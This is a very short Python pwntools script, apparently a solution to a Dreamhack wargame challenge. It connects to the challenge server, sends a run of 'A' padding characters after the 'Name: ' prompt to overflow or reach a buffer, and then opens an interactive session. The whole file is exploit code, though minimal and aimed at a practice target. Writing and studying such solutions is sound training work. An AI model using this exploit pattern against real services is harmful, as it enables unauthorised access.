#!/usr/bin/python3
from pwn import *

p = remote('host3.dreamhack.games', 23831)

payload = 'A'*(0x18-0x4)

p.sendafter(b'Name: ', payload)

p.interactive()
